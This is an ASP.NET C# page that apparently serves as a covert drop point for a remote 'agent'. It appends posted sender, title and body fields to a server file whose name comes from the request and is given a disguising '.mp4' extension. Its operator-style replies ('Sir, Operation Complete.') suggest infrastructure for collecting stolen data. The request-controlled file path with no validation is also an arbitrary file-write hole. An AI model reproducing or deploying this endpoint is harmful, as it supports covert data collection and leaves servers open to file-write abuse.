<%@ Page Language="C#" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        String logFileName;

        if (Request["logf"] == "" || Request["logf"] == null)
            logFileName = "unnammed";
        else
            logFileName = Request["logf"];
        
        String title = Request["titl"];
        String body = Request["bod"];
        String sndr = Request["sndr"];

        try
        {

            System.IO.StreamWriter sw = new System.IO.StreamWriter(MapPath(logFileName + ".mp4"), true, Encoding.Default);
            sw.WriteLine(sndr + ";" + System.DateTime.Now + ";" + title + ";" + body);
            sw.Close();

            Response.Write("Sir, Operation Complete.");
        }
        catch (Exception ex)
        {
            Response.Write("Maniyat Alarm:" + Environment.NewLine + ex.Message);
        }
        
    }
</script>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>.Main.Agent.Progress.</title>
</head>
<body>
    <b>
    Sir, kw: logf titl bod sndr
    <br />
    any other operation.
    </b>
</body>
</html>
